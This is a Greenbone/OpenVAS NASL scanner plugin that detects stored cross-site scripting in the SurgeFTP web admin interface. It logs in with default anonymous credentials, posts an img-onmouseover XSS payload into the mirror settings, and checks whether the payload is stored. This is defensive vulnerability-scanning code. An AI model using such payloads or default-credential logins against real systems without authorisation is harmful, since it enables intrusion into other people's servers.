if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806805" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "3.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-12-18 09:54:55 +0530 (Fri, 18 Dec 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Surgeftp Web Interface Multiple Stored XSS Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Netwin SurgeFTP
  Server and is prone to multiple stored XSS vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP POST method
  and check whether it is able to execute script or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to insufficient
  validation of user supplied input while adding new 'mirrors' and new
  'domains'" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attacker to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship between
  their browser and the server." );
	script_tag( name: "affected", value: "SurgeFTP 23d6" );
	script_tag( name: "solution", value: "No known solution was made available for at
  least one year since the disclosure of this vulnerability. Likely none will be
  provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/38762/" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "gb_default_credentials_options.sc" );
	script_require_ports( "Services/www", 7021 );
	script_mandatory_keys( "surgeftp/banner" );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 7021 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Basic realm=\"surgeftp" )){
	exit( 0 );
}
auth = base64( str: "anonymous:anonymous" );
host = http_host_name( port: port );
url = "/cgi/surgeftpmgr.cgi";
postData = "mirrorid=-1&mirror_ssl=TRUE&lcl=%3Cimg+src%3Dx+onmouseover%3Dalert%2" + "8%22XSS-TEST1%22%29%3E&remote_host=%3Cimg+src%3Dx+onmouseover%3Dalert%28%22XSS" + "-TEST1%22%29%3E&remote_path=%2Fpub%2Fxxxx&use_full_path_local=TRUE&files=*.zip" + "%2C*.tar.Z&xdelay=1440&user=anonymous&pass=secpod%40secpod123&cmd_mirror_save." + "x=23&cmd_mirror_save.y=16";
len = strlen( postData );
req1 = "POST " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Authorization: Basic " + auth + "\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + postData;
res1 = http_keepalive_send_recv( port: port, data: req1 );
if(IsMatchRegexp( res1, "^HTTP/1\\.[01] 200" ) && ContainsString( res1, ">Mirror settings <" )){
	req2 = "GET /cgi/surgeftpmgr.cgi?cmd=mirrors HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Authorization: Basic " + auth + "\r\n" + "\r\n";
	res2 = http_keepalive_send_recv( port: port, data: req2 );
	if(IsMatchRegexp( res2, "^HTTP/1\\.[01] 200" ) && ContainsString( res2, "><img src=x onmouseover=alert(\"XSS-TEST1\")" ) && ContainsString( res2, ">Mirrors<" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}

